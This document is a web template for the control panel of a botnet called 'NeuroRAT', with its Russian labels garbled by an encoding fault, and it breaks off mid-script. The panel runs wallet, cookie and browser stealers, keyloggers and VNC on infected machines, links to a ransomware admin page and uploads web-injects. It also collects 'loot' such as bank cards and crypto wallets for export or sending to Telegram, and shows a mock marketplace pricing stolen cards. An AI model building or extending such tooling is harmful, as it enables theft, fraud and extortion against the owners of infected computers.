{% extends "shared/base_layout.html" %}
{% block title %}Advanced Dashboard | NeuroRAT{% endblock %}
{% block content %}
<style>
body {
    background: #181c24;
    color: #e0e0e0;
    font-family: 'Fira Mono', 'Consolas', monospace;
}
.advanced-dashboard {
    max-width: 98vw;
    margin: 0 auto;
    padding: 2rem 1rem 1rem 1rem;
}
.tabs {
    display: flex;
    border-bottom: 2px solid #222;
    margin-bottom: 1.5rem;
}
.tab {
    padding: 1rem 2rem;
    cursor: pointer;
    background: none;
    border: none;
    color: #aaa;
    font-size: 1.1rem;
    transition: color 0.2s;
    border-bottom: 3px solid transparent;
}
.tab.active {
    color: #00ffe7;
    border-bottom: 3px solid #00ffe7;
    font-weight: bold;
}
.tab i { margin-right: 0.5em; }
.tab-content { display: none; opacity: 0; transform: translateY(20px); transition: opacity 0.4s, transform 0.4s; }
.tab-content.active { display: block; opacity: 1; transform: translateY(0); }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
.status-badge {
    display: inline-block;
    padding: 0.2em 0.7em;
    border-radius: 1em;
    font-size: 0.95em;
    font-weight: bold;
    background: #232b36;
    color: #00ffe7;
    margin-right: 0.5em;
}
.status-badge.inactive { color: #ff4e4e; background: #2a1a1a; }
.status-badge.pending { color: #ffb300; background: #2a210a; }
.table {
    width: 100%;
    border-collapse: collapse;
    background: #232b36;
    border-radius: 8px;
    overflow: hidden;
    margin-bottom: 2rem;
}
.table th, .table td {
    padding: 0.7em 1em;
    border-bottom: 1px solid #222;
    text-align: left;
}
.table th {
    background: #1a1e26;
    color: #00ffe7;
    font-weight: bold;
}
.table tr:last-child td { border-bottom: none; }
.action-btn {
    background: #00ffe7;
    color: #181c24;
    border: none;
    border-radius: 4px;
    padding: 0.4em 1em;
    font-weight: bold;
    cursor: pointer;
    margin-right: 0.5em;
    transition: background 0.2s, color 0.2s;
}
.action-btn:hover {
    background: #00bfae;
    color: #fff;
}
.filter-bar {
    margin-bottom: 1em;
    display: flex;
    gap: 1em;
    align-items: center;
}
input, select {
    background: #232b36;
    color: #e0e0e0;
    border: 1px solid #333;
    border-radius: 4px;
    padding: 0.4em 0.8em;
}
::-webkit-scrollbar { width: 8px; background: #232b36; }
::-webkit-scrollbar-thumb { background: #00ffe7; border-radius: 4px; }
.card-metrics {
    display: flex;
    gap: 2em;
    margin-bottom: 2em;
}
.metric-card {
    background: #232b36;
    border-radius: 8px;
    padding: 1.2em 2em;
    min-width: 180px;
    text-align: center;
    box-shadow: 0 2px 8px #0008;
}
.metric-card .value {
    font-size: 2.2em;
    color: #00ffe7;
    font-weight: bold;
}
.metric-card .label {
    color: #aaa;
    font-size: 1em;
    margin-top: 0.3em;
}
#ws-status {
    position: fixed;
    top: 18px;
    right: 32px;
    z-index: 9999;
    font-weight: bold;
    color: #00ffe7;
    background: #181c24;
    border-radius: 8px;
    padding: 0.4em 1.2em;
    box-shadow: 0 0 12px #00ffe7cc;
    display: flex;
    align-items: center;
    gap: 0.6em;
    transition: background 0.3s, color 0.3s, box-shadow 0.3s;
}
#ws-status.offline {
    color: #ff4e4e;
    background: #2a1a1a;
    box-shadow: 0 0 12px #ff4e4ecc;
}
.ws-dot {
    width: 12px; height: 12px; border-radius: 50%; background: #00ffe7; box-shadow: 0 0 8px #00ffe7cc; display: inline-block;
    transition: background 0.3s, box-shadow 0.3s;
}
#ws-status.offline .ws-dot { background: #ff4e4e; box-shadow: 0 0 8px #ff4e4ecc; }

/* –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ */
@keyframes glowIn { 0% { background: #00ffe733; } 100% { background: none; } }
.new-row { animation: glowIn 2s ease-out; }
.theme-selector {
    position: fixed; top: 18px; left: 32px; z-index: 9999;
    background: #181c24; color: #00ffe7; border-radius: 8px; padding: 0.4em 1.2em;
    box-shadow: 0 0 12px #00ffe7cc; font-weight: bold; display: flex; gap: 1em; align-items: center;
}
.theme-selector select { background: #232b36; color: #00ffe7; border: none; border-radius: 4px; padding: 0.2em 0.8em; }
#panic-btn {
    position: fixed; top: 18px; left: 220px; z-index: 9999;
    background: #ff4e4e; color: #fff; border-radius: 8px; padding: 0.4em 1.2em; font-weight: bold;
    box-shadow: 0 0 16px #ff4e4ecc; border: none; cursor: pointer; transition: background 0.2s;
}
#panic-btn:hover { background: #b30000; }
.marketplace-widget {
    background:#181c24;border-radius:12px;box-shadow:0 0 24px #ffe70099,0 2px 8px #0008;padding:1.2em 2em;min-width:320px;margin-bottom:2em;
    animation: glowIn 2s infinite alternate;
}
.marketplace-widget h3 { color:#ffe700; margin-bottom:0.5em; }
.marketplace-widget ul { list-style:none; padding:0; margin:0; }
.marketplace-widget li { color:#fff; margin-bottom:0.3em; }
body.theme-neon { background: #0f0c29; color: #00ffe7; }
body.theme-matrix { background: #0f0; color: #222; }
body.theme-matrix .advanced-dashboard { background: #000; color: #0f0; }
body.theme-matrix .table, body.theme-matrix .widget { background: #111; color: #0f0; }
body.theme-matrix .action-btn { background: #0f0; color: #000; }
body.theme-matrix .action-btn:hover { background: #00ffe7; color: #000; }
@media (max-width: 900px) {
    .card-metrics, .metrics-widgets, .tabs, .advanced-dashboard { flex-direction: column !important; gap: 1em !important; }
    .metric-card, .widget, .marketplace-widget { min-width: 90vw !important; }
    .tabs { flex-wrap: wrap; }
}
.table tbody:empty::after {
    content: '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'; display: block; text-align: center; color: #888; padding: 2em 0; font-size: 1.2em;
}
</style>
<div class="theme-selector">
    <span>–¢–µ–º–∞:</span>
    <select id="theme-select">
        <option value="">Dark</option>
        <option value="neon">Neon</option>
        <option value="matrix">Matrix</option>
    </select>
</div>
<button id="panic-btn"><i class="fa-solid fa-skull-crossbones"></i> Panic mode</button>
<div class="advanced-dashboard">
    <h1><i class="fa-solid fa-brain-circuit"></i> Advanced Botnet Dashboard</h1>
    <div class="card-metrics">
        <div class="metric-card">
            <div class="value">{{ metrics.total_agents }}</div>
            <div class="label">–í—Å–µ–≥–æ –∞–≥–µ–Ω—Ç–æ–≤</div>
        </div>
        <div class="metric-card">
            <a href="/ransomware_admin" class="btn btn-danger" style="width:100%">Ransomware Admin</a>
        </div>
        <div class="metric-card">
            <div class="value">{{ metrics.active_agents }}</div>
            <div class="label">–û–Ω–ª–∞–π–Ω</div>
        </div>
        <div class="metric-card">
            <div class="value">{{ metrics.total_logs }}</div>
            <div class="label">–õ–æ–≥–æ–≤</div>
        </div>
        <div class="metric-card">
            <div class="value">{{ metrics.total_files }}</div>
            <div class="label">–§–∞–π–ª–æ–≤</div>
        </div>
    </div>
    <div class="tabs">
        <button class="tab active" data-tab="agents"><i class="fa-solid fa-users"></i> –ê–≥–µ–Ω—Ç—ã</button>
        <button class="tab" data-tab="logs"><i class="fa-solid fa-scroll"></i> –õ–æ–≥–∏</button>
        <button class="tab" data-tab="files"><i class="fa-solid fa-folder-open"></i> –§–∞–π–ª—ã</button>
        <button class="tab" data-tab="loot"><i class="fa-solid fa-vault"></i> –õ—É—Ç</button>
        <button class="tab" data-tab="injects"><i class="fa-solid fa-syringe"></i> Web-injects</button>
        <button class="tab" data-tab="metrics"><i class="fa-solid fa-chart-line"></i> –ú–µ—Ç—Ä–∏–∫–∏</button>
        <button class="tab" data-tab="ai"><i class="fa-solid fa-brain"></i> AI Decisions</button>
        <button class="tab" data-tab="control"><i class="fa-solid fa-terminal"></i> –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ</button>
    </div>
    <div class="tab-content active" id="tab-agents">
        <div class="filter-bar">
            <input type="text" id="agent-search" placeholder="–ü–æ–∏—Å–∫ –ø–æ –∞–≥–µ–Ω—Ç—É, IP, —Ö–æ—Å—Ç—É...">
            <select id="agent-status-filter">
                <option value="">–í—Å–µ —Å—Ç–∞—Ç—É—Å—ã</option>
                <option value="active">–û–Ω–ª–∞–π–Ω</option>
                <option value="inactive">–û—Ñ—Ñ–ª–∞–π–Ω</option>
                <option value="pending">–û–∂–∏–¥–∞–Ω–∏–µ</option>
            </select>
        </div>
        <table class="table" id="agents-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>OS</th>
                    <th>Host</th>
                    <th>User</th>
                    <th>IP</th>
                    <th>–°—Ç–∞—Ç—É—Å</th>
                    <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                </tr>
            </thead>
            <tbody>
                {% for agent in agents %}
                <tr>
                    <td>{{ agent.agent_id }}</td>
                    <td>{{ agent.os }}</td>
                    <td>{{ agent.hostname }}</td>
                    <td>{{ agent.username }}</td>
                    <td>{{ agent.ip_address }}</td>
                    <td>
                        <span class="status-badge {% if agent.status == 'active' %}active{% elif agent.status == 'inactive' %}inactive{% else %}pending{% endif %}">
                            {{ agent.status|capitalize }}
                        </span>
                    </td>
                    <td>
                        <button class="action-btn" title="–û—Ç–∫—Ä—ã—Ç—å —á–∞—Ç"><i class="fa-solid fa-comments"></i></button>
                        <button class="action-btn" title="VNC"><i class="fa-solid fa-desktop"></i></button>
                        <button class="action-btn" title="–°–∫—Ä–∏–Ω—à–æ—Ç"><i class="fa-solid fa-image"></i></button>
                        <button class="action-btn" title="–§–∞–π–ª—ã"><i class="fa-solid fa-folder"></i></button>
                        <button class="action-btn" onclick="showReasoningModal('{{ agent.agent_id }}')">
                            <i class="fa-solid fa-brain"></i> Reasoning
                        </button>
                        <button class="action-btn" title="Wallet Stealer" onclick="runAgentModule('{{ agent.agent_id }}','wallets')"><i class="fa-solid fa-wallet"></i></button>
                        <button class="action-btn" title="Cookie Stealer" onclick="runAgentModule('{{ agent.agent_id }}','cookies')"><i class="fa-solid fa-cookie-bite"></i></button>
                        <button class="action-btn" title="Browser Stealer" onclick="runAgentModule('{{ agent.agent_id }}','browser')"><i class="fa-solid fa-globe"></i></button>
                        <button class="action-btn" title="System Info" onclick="runAgentModule('{{ agent.agent_id }}','system')"><i class="fa-solid fa-microchip"></i></button>
                        <button class="action-btn" title="Keylogger" onclick="runAgentModule('{{ agent.agent_id }}','keylogger')"><i class="fa-solid fa-keyboard"></i></button>
                        <button class="action-btn" title="VNC" onclick="runAgentModule('{{ agent.agent_id }}','vnc')"><i class="fa-solid fa-desktop"></i></button>
                        <button class="action-btn" title="ATS (–∑–∞–≥–ª—É—à–∫–∞)" onclick="runAgentModule('{{ agent.agent_id }}','ats')"><i class="fa-solid fa-robot"></i></button>
                        <button class="action-btn" title="Lateral Movement (–∑–∞–≥–ª—É—à–∫–∞)" onclick="runAgentModule('{{ agent.agent_id }}','lateral')"><i class="fa-solid fa-network-wired"></i></button>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    <div class="tab-content" id="tab-logs">
        <div class="filter-bar">
            <input type="text" id="log-search" placeholder="–ü–æ–∏—Å–∫ –ø–æ –ª–æ–≥–∞–º...">
            <select id="log-type-filter">
                <option value="">–í—Å–µ —Ç–∏–ø—ã</option>
                <option value="command">–ö–æ–º–∞–Ω–¥—ã</option>
                <option value="response">–û—Ç–≤–µ—Ç—ã</option>
                <option value="connection">–ü–æ–¥–∫–ª—é—á–µ–Ω–∏—è</option>
                <option value="terminate">–ó–∞–≤–µ—Ä—à–µ–Ω–∏—è</option>
                <option value="build">–°–±–æ—Ä–∫–∞</option>
            </select>
        </div>
        <table class="table" id="logs-table">
            <thead>
                <tr>
                    <th>–í—Ä–µ–º—è</th>
                    <th>–ê–≥–µ–Ω—Ç</th>
                    <th>–¢–∏–ø</th>
                    <th>–î–µ—Ç–∞–ª–∏</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log.timestamp | datetimeformat }}</td>
                    <td>{{ log.agent_id }}</td>
                    <td>{{ log.event_type }}</td>
                    <td>{{ log.details }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    <div class="tab-content" id="tab-files">
        <div class="filter-bar">
            <input type="text" id="file-search" placeholder="–ü–æ–∏—Å–∫ –ø–æ —Ñ–∞–π–ª–∞–º...">
            <button class="action-btn"><i class="fa-solid fa-download"></i> –°–∫–∞—á–∞—Ç—å –≤—Å—ë</button>
            <button class="action-btn"><i class="fa-solid fa-trash"></i> –£–¥–∞–ª–∏—Ç—å –≤—ã–±—Ä–∞–Ω–Ω—ã–µ</button>
            <input type="file" id="file-upload" multiple style="display:none;">
            <button class="action-btn" onclick="document.getElementById('file-upload').click();"><i class="fa-solid fa-upload"></i> –ó–∞–≥—Ä—É–∑–∏—Ç—å</button>
        </div>
        <table class="table" id="files-table">
            <thead>
                <tr>
                    <th><input type="checkbox" id="select-all-files"></th>
                    <th>–ò–º—è —Ñ–∞–π–ª–∞</th>
                    <th>–ê–≥–µ–Ω—Ç</th>
                    <th>–†–∞–∑–º–µ—Ä</th>
                    <th>–ö–∞—Ç–µ–≥–æ—Ä–∏—è</th>
                    <th>–í—Ä–µ–º—è</th>
                    <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                </tr>
            </thead>
            <tbody>
                {% for file in files %}
                <tr>
                    <td><input type="checkbox" class="file-checkbox"></td>
                    <td>{{ file.name }}</td>
                    <td>{{ file.agent_id }}</td>
                    <td>{{ file.size }}</td>
                    <td>{{ file.category }}</td>
                    <td>{{ file.timestamp | datetimeformat }}</td>
                    <td>
                        <button class="action-btn" title="–°–∫–∞—á–∞—Ç—å"><i class="fa-solid fa-download"></i></button>
                        <button class="action-btn" title="–£–¥–∞–ª–∏—Ç—å"><i class="fa-solid fa-trash"></i></button>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    <div class="tab-content" id="tab-loot">
        <div class="filter-bar">
            <input type="text" id="loot-search" placeholder="–ü–æ–∏—Å–∫ –ø–æ –ª—É—Ç—É (–∫–∞—Ä—Ç–∞, –∫–æ—à–µ–ª–µ–∫, cookie, –∞–≥–µ–Ω—Ç, —Ç–µ–≥)...">
            <select id="loot-type-filter">
                <option value="">–í—Å–µ —Ç–∏–ø—ã</option>
                <option value="card">–ö–∞—Ä—Ç—ã</option>
                <option value="wallet">–ö–æ—à–µ–ª—å–∫–∏</option>
                <option value="cookie">Cookies</option>
            </select>
            <button class="action-btn" id="loot-collect-all"><i class="fa-solid fa-magnet"></i> –°–æ–±—Ä–∞—Ç—å –≤—Å—ë</button>
            <button class="action-btn" id="loot-export-csv"><i class="fa-solid fa-file-csv"></i> –≠–∫—Å–ø–æ—Ä—Ç CSV</button>
            <button class="action-btn" id="loot-export-json"><i class="fa-solid fa-file-code"></i> –≠–∫—Å–ø–æ—Ä—Ç JSON</button>
            <button class="action-btn" id="loot-export-txt"><i class="fa-solid fa-file-lines"></i> –≠–∫—Å–ø–æ—Ä—Ç TXT</button>
            <button class="action-btn" id="loot-send-telegram"><i class="fa-brands fa-telegram"></i> –í Telegram</button>
        </div>
        <table class="table" id="loot-table">
            <thead>
                <tr>
                    <th>–¢–∏–ø</th>
                    <th>–ó–Ω–∞—á–µ–Ω–∏–µ</th>
                    <th>–ê–≥–µ–Ω—Ç</th>
                    <th>–í—Ä–µ–º—è</th>
                    <th>–¢–µ–≥–∏</th>
                    <th>–ó–∞–º–µ—Ç–∫–∏</th>
                    <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>
    <div class="tab-content" id="tab-injects">
        <div class="filter-bar">
            <input type="file" id="inject-upload" style="display:none;">
            <button class="action-btn" onclick="document.getElementById('inject-upload').click();"><i class="fa-solid fa-upload"></i> –ó–∞–≥—Ä—É–∑–∏—Ç—å –∏–Ω—ä–µ–∫—Ü–∏—é</button>
        </div>
        <table class="table" id="injects-table">
            <thead>
                <tr>
                    <th>–ò–º—è</th>
                    <th>–ó–∞–≥—Ä—É–∂–µ–Ω–æ</th>
                    <th>–°—Ç–∞—Ç—É—Å</th>
                    <th>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</th>
                    <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>
    <div class="tab-content" id="tab-metrics">
        <div class="metrics-widgets" style="display:flex;gap:2em;flex-wrap:wrap;margin-bottom:2em;">
            <div class="widget" id="widget-top-agents" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">–¢–æ–ø-5 –∞–≥–µ–Ω—Ç–æ–≤ –ø–æ —Ñ–∞–π–ª–∞–º</div>
                <ul id="top-agents-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
            <div class="widget" id="widget-modules" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">–°—Ç–∞—Ç—É—Å –º–æ–¥—É–ª–µ–π</div>
                <ul id="modules-status-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
            <div class="widget" id="widget-attacks" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #ff00e799,0 2px 8px #0008;padding:1.2em 2em;min-width:260px;">
                <div style="font-weight:bold;color:#ff00e7;font-size:1.1em;margin-bottom:0.5em;">–ê–∫—Ç–∏–≤–Ω—ã–µ –∞—Ç–∞–∫–∏</div>
                <ul id="active-attacks-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
            <div class="widget" id="widget-minimap" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:260px;">
                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">–ú–∏–Ω–∏-–∫–∞—Ä—Ç–∞ (–¥–µ–º–æ)</div>
                <canvas id="minimap-canvas" width="200" height="120" style="background:#232b36;border-radius:8px;"></canvas>
            </div>
        </div>
        <div style="display:flex;gap:2em;flex-wrap:wrap;align-items:flex-start;">
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-pie" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
            </div>
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-bar" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #ff00e799;"></canvas>
            </div>
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-radial" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
            </div>
        </div>
    </div>
    <div class="tab-content" id="tab-ai">
        <div class="metrics-widgets" style="display:flex;gap:2em;flex-wrap:wrap;margin-bottom:2em;">
            <div class="widget" id="widget-top-loot-agents" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #ffe70099,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
                <div style="font-weight:bold;color:#ffe700;font-size:1.1em;margin-bottom:0.5em;">–¢–æ–ø-–∞–≥–µ–Ω—Ç—ã –ø–æ –ª—É—Ç—É</div>
                <ul id="top-loot-agents-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
            <div class="widget" id="widget-fresh-cards" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ffe799,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
                <div style="font-weight:bold;color:#00ffe7;font-size:1.1em;margin-bottom:0.5em;">–°–≤–µ–∂–∏–µ –∫–∞—Ä—Ç—ã</div>
                <ul id="fresh-cards-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
            <div class="widget" id="widget-fresh-wallets" style="background:#181c24;border-radius:12px;box-shadow:0 0 24px #00ff6a99,0 2px 8px #0008;padding:1.2em 2em;min-width:220px;">
                <div style="font-weight:bold;color:#00ff6a;font-size:1.1em;margin-bottom:0.5em;">–°–≤–µ–∂–∏–µ –∫–æ—à–µ–ª—å–∫–∏</div>
                <ul id="fresh-wallets-list" style="list-style:none;padding:0;margin:0;"></ul>
            </div>
        </div>
        <div style="display:flex;gap:2em;flex-wrap:wrap;align-items:flex-start;">
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-pie" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
            </div>
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-bar" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #ff00e799;"></canvas>
            </div>
            <div style="flex:1;min-width:320px;">
                <canvas id="metrics-radial" style="width:100%;max-width:400px;height:320px;background:#232b36;border-radius:12px;box-shadow:0 0 24px #00ffe799;"></canvas>
            </div>
        </div>
    </div>
    <div class="tab-content" id="tab-control">
        <div style="margin-bottom:2em;">(–ú–∞—Å—Å–æ–≤—ã–µ –¥–µ–π—Å—Ç–≤–∏—è: –∑–∞–ø—É—Å–∫ –º–æ–¥—É–ª–µ–π, —É–¥–∞–ª–µ–Ω–∏–µ, –∞–∫—Ç–∏–≤–∞—Ü–∏—è VNC, keylogger, screenshot –∏ —Ç.–¥.)</div>
        <button class="action-btn"><i class="fa-solid fa-desktop"></i> –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å VNC –Ω–∞ –≤—Å–µ—Ö</button>
        <button class="action-btn"><i class="fa-solid fa-keyboard"></i> –í–∫–ª—é—á–∏—Ç—å –∫–µ–π–ª–æ–≥–≥–µ—Ä</button>
        <button class="action-btn"><i class="fa-solid fa-image"></i> –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç—ã</button>
        <button class="action-btn"><i class="fa-solid fa-bug"></i> –ò–Ω—ä–µ–∫—Ü–∏—è</button>
    </div>
</div>
<div id="ws-status"><span class="ws-dot"></span> LIVE</div>
<!-- Marketplace widget (–¥–µ–º–æ) -->
<div class="marketplace-widget">
    <h3><i class="fa-solid fa-shop"></i> Marketplace (–¥–µ–º–æ)</h3>
    <ul>
        <li>üí≥ 10 –∫–∞—Ä—Ç (RU, BIN 4276) ‚Äî <span style="color:#00ff6a;">$100</span></li>
        <li>ü™ô 2 BTC-–∫–æ—à–µ–ª—å–∫–∞ ‚Äî <span style="color:#00ff6a;">$500</span></li>
        <li>üç™ 1000 cookies (Google, Facebook) ‚Äî <span style="color:#00ff6a;">$50</span></li>
        <li>üí≥ 5 –∫–∞—Ä—Ç (UA, BIN 4149) ‚Äî <span style="color:#00ff6a;">$60</span></li>
        <li>ü™ô 1 ETH-–∫–æ—à–µ–ª–µ–∫ ‚Äî <span style="color:#00ff6a;">$200</span></li>
    </ul>
    <div style="margin-top:1em;"><button class="action-btn"><i class="fa-solid fa-cart-shopping"></i> –ö—É–ø–∏—Ç—å (–∑–∞–≥–ª—É—à–∫–∞)</button></div>
</div>
<!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è reasoning -->
<div id="reasoning-modal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center;">
    <div style="background:#232b36; color:#e0e0e0; border-radius:12px; max-width:600px; width:90vw; padding:2em; box-shadow:0 0 32px #00ffe7cc; position:relative;">
        <button onclick="closeReasoningModal()" style="position:absolute; top:1em; right:1em; background:none; border:none; color:#00ffe7; font-size:1.5em; cursor:pointer;">&times;</button>
        <h2><i class="fa-solid fa-brain"></i> Reasoning & –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏</h2>
        <div id="reasoning-content">
            <div style="text-align:center; color:#aaa;">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
        </div>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
// –í–∫–ª–∞–¥–∫–∏
const tabs = document.querySelectorAll('.tab');
const tabContents = document.querySelectorAll('.tab-content');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        tabContents.forEach(tc => tc.classList.remove('active'));
        document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
        if(tab.dataset.tab === 'files') loadFiles();
        if(tab.dataset.tab === 'logs') loadLogs();
        if(tab.dataset.tab === 'metrics') loadMetrics();
    });
});

// --- –§–∞–π–ª—ã ---
async function loadFiles() {
    const search = document.getElementById('file-search').value;
    const res = await fetch(`/api/files?search=${encodeURIComponent(search)}`);
    const data = await res.json();
    const tbody = document.querySelector('#files-table tbody');
    tbody.innerHTML = '';
    data.files.forEach(file => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><input type='checkbox' class='file-checkbox' data-id='${file.file_id}'></td>
            <td>${file.name}</td>
            <td>${file.agent_id}</td>
            <td>${file.size}</td>
            <td>${file.category}</td>
            <td>${formatTime(file.timestamp)}</td>
            <td>
                <button class='action-btn' title='–°–∫–∞—á–∞—Ç—å' onclick='downloadFile("${file.file_id}")'><i class='fa-solid fa-download'></i></button>
                <button class='action-btn' title='–£–¥–∞–ª–∏—Ç—å' onclick='deleteFiles(["${file.file_id}"])'><i class='fa-solid fa-trash'></i></button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    ensureTableNotEmpty('files-table');
}
window.loadFiles = loadFiles;

async function downloadFile(file_id) {
    window.open(`/api/files/download?file_id=${file_id}`, '_blank');
}

async function deleteFiles(file_ids) {
    if(!confirm('–£–¥–∞–ª–∏—Ç—å –≤—ã–±—Ä–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã?')) return;
    await fetch('/api/files/delete', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({file_ids})
    });
    showToast('–§–∞–π–ª—ã —É–¥–∞–ª–µ–Ω—ã');
    loadFiles();
}

// –ú–∞—Å—Å–æ–≤–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
const selectAllFiles = document.getElementById('select-all-files');
if(selectAllFiles) {
    selectAllFiles.addEventListener('change', () => {
        document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = selectAllFiles.checked);
    });
}
document.querySelector('#tab-files').addEventListener('click', e => {
    if(e.target.closest('.action-btn') && e.target.closest('.action-btn').textContent.includes('–£–¥–∞–ª–∏—Ç—å')) {
        const checked = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.dataset.id);
        if(checked.length) deleteFiles(checked);
    }
    if(e.target.closest('.action-btn') && e.target.closest('.action-btn').textContent.includes('–°–∫–∞—á–∞—Ç—å –≤—Å—ë')) {
        document.querySelectorAll('.file-checkbox').forEach(cb => downloadFile(cb.dataset.id));
    }
});
document.getElementById('file-search').addEventListener('input', loadFiles);

// Drag&Drop upload
const fileUpload = document.getElementById('file-upload');
fileUpload.addEventListener('change', async e => {
    for(const file of e.target.files) {
        const form = new FormData();
        form.append('file', file);
        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º agent_id (–≤—ã–±—Ä–∞–Ω–Ω—ã–π –∞–≥–µ–Ω—Ç –∏–ª–∏ 'manual')
        let agent_id = 'manual';
        const agentSelect = document.getElementById('agent-search');
        if(agentSelect && agentSelect.value) agent_id = agentSelect.value;
        form.append('agent_id', agent_id);
        form.append('category', 'other');
        const res = await fetch('/api/files/upload', { method: 'POST', body: form });
        if(res.ok) showToast('–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω');
        else showToast('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞');
    }
    loadFiles();
});

// Drag&Drop –Ω–∞ –æ–±–ª–∞—Å—Ç—å —Ç–∞–±–ª–∏—Ü—ã —Ñ–∞–π–ª–æ–≤
const filesTable = document.getElementById('files-table');
filesTable.addEventListener('dragover', e => { e.preventDefault(); filesTable.style.background = '#222'; });
filesTable.addEventListener('dragleave', e => { filesTable.style.background = ''; });
filesTable.addEventListener('drop', async e => {
    e.preventDefault();
    filesTable.style.background = '';
    const files = e.dataTransfer.files;
    for(const file of files) {
        const form = new FormData();
        form.append('file', file);
        let agent_id = 'manual';
        const agentSelect = document.getElementById('agent-search');
        if(agentSelect && agentSelect.value) agent_id = agentSelect.value;
        form.append('agent_id', agent_id);
        form.append('category', 'other');
        const res = await fetch('/api/files/upload', { method: 'POST', body: form });
        if(res.ok) showToast('–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω');
        else showToast('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞');
    }
    loadFiles();
});

// --- –õ–æ–≥–∏ ---
async function loadLogs() {
    const search = document.getElementById('log-search').value;
    const type = document.getElementById('log-type-filter').value;
    const res = await fetch(`/api/logs?search=${encodeURIComponent(search)}&type=${encodeURIComponent(type)}`);
    const data = await res.json();
    const tbody = document.querySelector('#logs-table tbody');
    tbody.innerHTML = '';
    data.logs.forEach(log => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${formatTime(log.timestamp)}</td>
            <td>${log.agent_id || ''}</td>
            <td>${log.event_type}</td>
            <td>${log.details}</td>
        `;
        tbody.appendChild(tr);
    });
    ensureTableNotEmpty('logs-table');
}
document.getElementById('log-search').addEventListener('input', loadLogs);
document.getElementById('log-type-filter').addEventListener('change', loadLogs);
window.loadLogs = loadLogs;

// --- –ú–µ—Ç—Ä–∏–∫–∏ ---
let metricsChart = null, pieChart = null, barChart = null, radialChart = null;
async function loadMetrics() {
    const res = await fetch('/api/metrics');
    const data = await res.json();
    // –û–±–Ω–æ–≤–∏—Ç—å –∫–∞—Ä—Ç–æ—á–∫–∏
